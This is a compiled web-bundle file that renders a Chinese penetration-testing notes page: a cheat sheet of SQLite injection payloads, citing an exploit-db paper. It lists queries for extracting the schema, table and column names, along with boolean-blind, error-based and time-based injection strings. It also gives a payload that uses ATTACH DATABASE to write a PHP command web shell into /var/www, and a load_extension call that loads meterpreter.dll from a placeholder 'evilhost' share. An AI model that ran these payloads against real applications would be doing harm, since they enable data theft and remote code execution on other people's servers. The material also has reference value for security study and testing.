"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[8456],{8453:(e,l,s)=>{s.d(l,{R:()=>a,x:()=>r});var n=s(6540);const t={},i=n.createContext(t);function a(e){const l=n.useContext(i);return n.useMemo(function(){return"function"==typeof e?e(l):{...l,...e}},[l,e])}function r(e){let l;return l=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:a(e.components),n.createElement(i.Provider,{value:l},e.children)}},8488:(e,l,s)=>{s.r(l),s.d(l,{assets:()=>d,contentTitle:()=>r,default:()=>h,frontMatter:()=>a,metadata:()=>n,toc:()=>c});const n=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/SQLite","title":"SQLite","description":"|\u4f5c\u8005|\u4fee\u8ba2\u65f6\u95f4|","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165/06.SQLite.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/SQLite","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/SQLite","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165/06.SQLite.md","tags":[],"version":"current","sidebarPosition":6,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"PostgreSQL","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/PostgreSQL"},"next":{"title":"MSSQL","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/MSSQL"}}');var t=s(4848),i=s(8453);const a={},r=void 0,d={},c=[{value:"SQLite \u6ce8\u91ca",id:"sqlite-\u6ce8\u91ca",level:2},{value:"SQLite \u7248\u672c",id:"sqlite-\u7248\u672c",level:2},{value:"\u57fa\u4e8e\u5b57\u7b26\u4e32-\u63d0\u53d6\u6570\u636e\u5e93\u7ed3\u6784",id:"\u57fa\u4e8e\u5b57\u7b26\u4e32-\u63d0\u53d6\u6570\u636e\u5e93\u7ed3\u6784",level:2},{value:"\u6574\u6570/\u57fa\u4e8e\u5b57\u7b26\u4e32-\u63d0\u53d6\u8868\u540d",id:"\u6574\u6570\u57fa\u4e8e\u5b57\u7b26\u4e32-\u63d0\u53d6\u8868\u540d",level:2},{value:"\u6574\u6570/\u57fa\u4e8e\u5b57\u7b26\u4e32-\u63d0\u53d6\u5217\u540d",id:"\u6574\u6570\u57fa\u4e8e\u5b57\u7b26\u4e32-\u63d0\u53d6\u5217\u540d",level:2},{value:"\u5e03\u5c14\u503c-\u8ba1\u7b97\u8868\u6570",id:"\u5e03\u5c14\u503c-\u8ba1\u7b97\u8868\u6570",level:2},{value:"\u5e03\u5c14\u503c-\u679a\u4e3e\u8868\u540d",id:"\u5e03\u5c14\u503c-\u679a\u4e3e\u8868\u540d",level:2},{value:"\u5e03\u5c14\u503c-\u63d0\u53d6\u4fe1\u606f",id:"\u5e03\u5c14\u503c-\u63d0\u53d6\u4fe1\u606f",level:2},{value:"\u5e03\u5c14\u503c-\u63d0\u53d6\u4fe1\u606f\uff08\u6392\u5e8f\u4f9d\u636e\uff09",id:"\u5e03\u5c14\u503c-\u63d0\u53d6\u4fe1\u606f\u6392\u5e8f\u4f9d\u636e",level:2},{value:"\u5e03\u5c14\u503c-\u57fa\u4e8e\u9519\u8bef",id:"\u5e03\u5c14\u503c-\u57fa\u4e8e\u9519\u8bef",level:2},{value:"\u57fa\u4e8e\u65f6\u95f4",id:"\u57fa\u4e8e\u65f6\u95f4",level:2},{value:"\u4f7f\u7528 SQLite \u547d\u4ee4\u6267\u884c\u8fdc\u7a0b\u547d\u4ee4-\u9644\u52a0\u6570\u636e\u5e93",id:"\u4f7f\u7528-sqlite-\u547d\u4ee4\u6267\u884c\u8fdc\u7a0b\u547d\u4ee4-\u9644\u52a0\u6570\u636e\u5e93",level:2},{value:"\u4f7f\u7528 SQLite \u547d\u4ee4\u6267\u884c\u8fdc\u7a0b\u547d\u4ee4-Load_extension",id:"\u4f7f\u7528-sqlite-\u547d\u4ee4\u6267\u884c\u8fdc\u7a0b\u547d\u4ee4-load_extension",level:2},{value:"\u53c2\u8003\u6587\u732e",id:"\u53c2\u8003\u6587\u732e",level:2}];function o(e){const l={a:"a",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,i.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsxs)(l.table,{children:[(0,t.jsx)(l.thead,{children:(0,t.jsxs)(l.tr,{children:[(0,t.jsx)(l.th,{style:{textAlign:"left"},children:"\u4f5c\u8005"}),(0,t.jsx)(l.th,{style:{textAlign:"left"},children:"\u4fee\u8ba2\u65f6\u95f4"})]})}),(0,t.jsx)(l.tbody,{children:(0,t.jsxs)(l.tr,{children:[(0,t.jsx)(l.td,{style:{textAlign:"left"},children:(0,t.jsx)(l.img,{src:"https://img.shields.io/badge/wjlin0-blog-green",alt:"wjlin0"})}),(0,t.jsx)(l.td,{style:{textAlign:"left"},children:"2023-07-05 21:37:29"})]})})]}),"\n",(0,t.jsx)(l.h2,{id:"sqlite-\u6ce8\u91ca",children:"SQLite \u6ce8\u91ca"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-sql",children:"--\n/**/\n"})}),"\n",(0,t.jsx)(l.h2,{id:"sqlite-\u7248\u672c",children:"SQLite \u7248\u672c"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-sql",children:"select sqlite_version();\n"})}),"\n",(0,t.jsx)(l.h2,{id:"\u57fa\u4e8e\u5b57\u7b26\u4e32-\u63d0\u53d6\u6570\u636e\u5e93\u7ed3\u6784",children:"\u57fa\u4e8e\u5b57\u7b26\u4e32-\u63d0\u53d6\u6570\u636e\u5e93\u7ed3\u6784"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-sql",children:"SELECT sql FROM sqlite_schema\n"})}),"\n",(0,t.jsx)(l.h2,{id:"\u6574\u6570\u57fa\u4e8e\u5b57\u7b26\u4e32-\u63d0\u53d6\u8868\u540d",children:"\u6574\u6570/\u57fa\u4e8e\u5b57\u7b26\u4e32-\u63d0\u53d6\u8868\u540d"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-sql",children:"SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'\n"})}),"\n",(0,t.jsx)(l.p,{children:"\u4f7f\u7528\u6781\u9650 X+1 \u504f\u79fb X \u63d0\u53d6\u6240\u6709\u8868\u683c\u3002"}),"\n",(0,t.jsx)(l.h2,{id:"\u6574\u6570\u57fa\u4e8e\u5b57\u7b26\u4e32-\u63d0\u53d6\u5217\u540d",children:"\u6574\u6570/\u57fa\u4e8e\u5b57\u7b26\u4e32-\u63d0\u53d6\u5217\u540d"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-sql",children:"SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'\n"})}),"\n",(0,t.jsx)(l.p,{children:"\u5bf9\u4e8e\u5e72\u51c0\u7684\u8f93\u51fa"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-sql",children:"SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),\"TEXT\",''),\"INTEGER\",''),\"AUTOINCREMENT\",''),\"PRIMARY KEY\",''),\"UNIQUE\",''),\"NUMERIC\",''),\"REAL\",''),\"BLOB\",''),\"NOT NULL\",''),\",\",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'\n"})}),"\n",(0,t.jsx)(l.h2,{id:"\u5e03\u5c14\u503c-\u8ba1\u7b97\u8868\u6570",children:"\u5e03\u5c14\u503c-\u8ba1\u7b97\u8868\u6570"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-sql",children:"and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table\n"})}),"\n",(0,t.jsx)(l.h2,{id:"\u5e03\u5c14\u503c-\u679a\u4e3e\u8868\u540d",children:"\u5e03\u5c14\u503c-\u679a\u4e3e\u8868\u540d"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-sql",children:"and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number\n"})}),"\n",(0,t.jsx)(l.h2,{id:"\u5e03\u5c14\u503c-\u63d0\u53d6\u4fe1\u606f",children:"\u5e03\u5c14\u503c-\u63d0\u53d6\u4fe1\u606f"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-sql",children:"and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')\n"})}),"\n",(0,t.jsx)(l.h2,{id:"\u5e03\u5c14\u503c-\u63d0\u53d6\u4fe1\u606f\u6392\u5e8f\u4f9d\u636e",children:"\u5e03\u5c14\u503c-\u63d0\u53d6\u4fe1\u606f\uff08\u6392\u5e8f\u4f9d\u636e\uff09"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-sql",children:"CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('some_char') THEN <order_element_1> ELSE <order_element_2> END\n"})}),"\n",(0,t.jsx)(l.h2,{id:"\u5e03\u5c14\u503c-\u57fa\u4e8e\u9519\u8bef",children:"\u5e03\u5c14\u503c-\u57fa\u4e8e\u9519\u8bef"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-sql",children:"AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END\n"})}),"\n",(0,t.jsx)(l.h2,{id:"\u57fa\u4e8e\u65f6\u95f4",children:"\u57fa\u4e8e\u65f6\u95f4"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-sql",children:"AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))\n"})}),"\n",(0,t.jsx)(l.h2,{id:"\u4f7f\u7528-sqlite-\u547d\u4ee4\u6267\u884c\u8fdc\u7a0b\u547d\u4ee4-\u9644\u52a0\u6570\u636e\u5e93",children:"\u4f7f\u7528 SQLite \u547d\u4ee4\u6267\u884c\u8fdc\u7a0b\u547d\u4ee4-\u9644\u52a0\u6570\u636e\u5e93"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-sql",children:"ATTACH DATABASE '/var/www/lol.php' AS lol;\nCREATE TABLE lol.pwn (dataz text);\nINSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['cmd']); ?>\");--\n"})}),"\n",(0,t.jsx)(l.h2,{id:"\u4f7f\u7528-sqlite-\u547d\u4ee4\u6267\u884c\u8fdc\u7a0b\u547d\u4ee4-load_extension",children:"\u4f7f\u7528 SQLite \u547d\u4ee4\u6267\u884c\u8fdc\u7a0b\u547d\u4ee4-Load_extension"}),"\n",(0,t.jsx)(l.pre,{children:(0,t.jsx)(l.code,{className:"language-sql",children:"UNION SELECT 1,load_extension('\\\\evilhost\\evilshare\\meterpreter.dll','DllMain');--\n"})}),"\n",(0,t.jsx)(l.p,{children:"\u6ce8\u610f\uff1a\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6b64\u7ec4\u4ef6\u5904\u4e8e\u7981\u7528\u72b6\u6001"}),"\n",(0,t.jsx)(l.h2,{id:"\u53c2\u8003\u6587\u732e",children:"\u53c2\u8003\u6587\u732e"}),"\n",(0,t.jsx)(l.p,{children:(0,t.jsx)(l.a,{href:"https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf",children:"\u6ce8\u5165\u57fa\u4e8e SQLite \u6570\u636e\u5e93\u7684\u5e94\u7528\u7a0b\u5e8f-Manish Kishan Tanwar"})})]})}function h(e={}){const{wrapper:l}={...(0,i.R)(),...e.components};return l?(0,t.jsx)(l,{...e,children:(0,t.jsx)(o,{...e})}):o(e)}}}]);